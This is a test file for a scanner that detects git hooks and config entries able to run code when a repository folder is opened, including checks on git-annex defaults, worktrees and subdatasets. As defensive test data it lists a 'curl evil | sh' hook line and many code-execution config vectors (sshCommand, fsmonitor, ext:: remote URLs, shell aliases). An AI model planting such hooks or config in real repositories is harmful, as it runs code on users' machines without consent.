import test from 'node:test'
import assert from 'node:assert/strict'
import { execFileSync } from 'node:child_process'
import { appendFileSync } from 'node:fs'
import { mkdtemp, mkdir, writeFile, chmod, realpath } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { findExecVectors, createTrustStore } from '../src/gui/folder-trust.js'

const git = (cwd, ...args) => execFileSync('git', ['-C', cwd, ...args], { encoding: 'utf8', stdio: 'pipe' })
const ANNEX_FILTER = `[filter "annex"]
\tsmudge = git-annex smudge -- %f
\tclean = git-annex smudge --clean -- %f
\tprocess = git-annex filter-process
`
const ANNEX_PRE_COMMIT = '#!/bin/sh\n# automatically configured by git-annex\ngit annex pre-commit .\n'

async function hook(gitDir, name, body) {
  await mkdir(join(gitDir, 'hooks'), { recursive: true })
  const file = join(gitDir, 'hooks', name)
  await writeFile(file, body)
  await chmod(file, 0o755)
}

// A real repository, so the scanner is tested against what git itself reads.
async function repo({ config = '', hooks = {} } = {}) {
  const dir = await realpath(await mkdtemp(join(tmpdir(), 'trust-')))
  git(dir, 'init', '-q')
  appendFileSync(join(dir, '.git', 'config'), config)
  for (const [name, body] of Object.entries(hooks)) await hook(join(dir, '.git'), name, body)
  return dir
}
const flagged = async (dir) => (await findExecVectors(dir)).join('\n')

test('a plain repo with sample hooks has nothing that can run code', async () => {
  assert.deepEqual(await findExecVectors(await repo({ hooks: { 'pre-commit.sample': '#!/bin/sh\nexit 0\n' } })), [])
})

test('the stock git-annex hooks and filter are not flagged', async () => {
  const dir = await repo({ config: ANNEX_FILTER + '[annex]\n\tuuid = 1234\n\tversion = 10\n', hooks: { 'pre-commit': ANNEX_PRE_COMMIT } })
  assert.deepEqual(await findExecVectors(dir), [])
})

test('a git-annex hook with an extra line is flagged', async () => {
  assert.match(await flagged(await repo({ hooks: { 'pre-commit': `${ANNEX_PRE_COMMIT}curl evil | sh\n` } })), /hook pre-commit/)
})

test('config that can run programs is flagged, however it is spelled', async () => {
  for (const snippet of [
    '[core]\n\tsshCommand = evil\n',
    '[core]\n\tfsmonitor = touch x\n',
    '[core]\n\thooksPath = /tmp/hooks\n',
    '[core] hooksPath = /tmp/evil\n', // key on the header line
    '[CORE]\n\tHOOKSPATH = /tmp/evil\n',
    '[alias]\n\tst = !sh -c evil\n',
    '[filter "evil"]\n\tclean = evil\n',
    '[diff "x"]\n\ttextconv = evil\n',
    '[diff "x"]\n\tcommand = evil\n',
    '[credential]\n\thelper = !evil\n',
    '[include]\n\tpath = ../evil\n',
    '[gpg "ssh"]\n\tdefaultKeyCommand = evil\n',
    '[annex]\n\tfreeze-command = evil\n',
    '[datalad "result-hook.x"]\n\tcall-json = evil\n',
    '[protocol "ext"]\n\tallow = always\n',
    '[submodule "s"]\n\tupdate = !evil\n',
    '[remote "o"]\n\turl = ext::sh -c evil\n'
  ]) {
    assert.ok((await findExecVectors(await repo({ config: snippet }))).length > 0, `not flagged: ${snippet}`)
  }
})

test('a filter named annex with a different command is flagged', async () => {
  assert.match(await flagged(await repo({ config: '[filter "annex"]\n\tsmudge = evil\n' })), /filter\.annex\.smudge/)
})

test('an odd entry inside hooks/ cannot hide a later malicious hook', async () => {
  const dir = await repo({ hooks: { 'pre-commit': '#!/bin/sh\nevil\n' } })
  await mkdir(join(dir, '.git', 'hooks', 'aaa-directory'))
  assert.match(await flagged(dir), /hook pre-commit/)
})

test('a linked worktree is judged by the shared config and hooks git actually uses', async () => {
  const main = await repo({ config: '[core]\n\tsshCommand = evil\n', hooks: { 'post-commit': '#!/bin/sh\nevil\n' } })
  git(main, '-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-q', '--allow-empty', '-m', 'x')
  const wt = join(await realpath(await mkdtemp(join(tmpdir(), 'trust-wt-'))), 'wt')
  git(main, 'worktree', 'add', '-q', wt)
  const out = await flagged(wt)
  assert.match(out, /hook post-commit/)
  assert.match(out, /core\.sshcommand/)
})

test('opening a subfolder judges the repository that contains it', async () => {
  const dir = await repo({ hooks: { 'pre-commit': '#!/bin/sh\nevil\n' } })
  await mkdir(join(dir, 'deep', 'er'), { recursive: true })
  assert.match(await flagged(join(dir, 'deep', 'er')), /hook pre-commit/)
})

test('a registered subdataset is scanned too, and reported with its path', async () => {
  const dir = await repo()
  const sub = join(dir, 'sub-01')
  await mkdir(sub)
  git(sub, 'init', '-q')
  await hook(join(sub, '.git'), 'post-commit', '#!/bin/sh\nevil\n')
  await writeFile(join(dir, '.gitmodules'), '[submodule "sub-01"]\n\tpath = sub-01\n\turl = ./sub-01\n')
  assert.match(await flagged(dir), /sub-01: hook post-commit/)
})

test('a folder that is not a repository has no vectors', async () => {
  assert.deepEqual(await findExecVectors(await mkdtemp(join(tmpdir(), 'trust-none-'))), [])
})

test('the trust store remembers folders across instances', async () => {
  const dir = await mkdtemp(join(tmpdir(), 'trust-store-'))
  const file = join(dir, 'trusted.json')
  const target = await repo()
  const first = createTrustStore(file)
  assert.equal(first.has(target), false)
  first.add(target)
  assert.equal(createTrustStore(file).has(target), true)
})
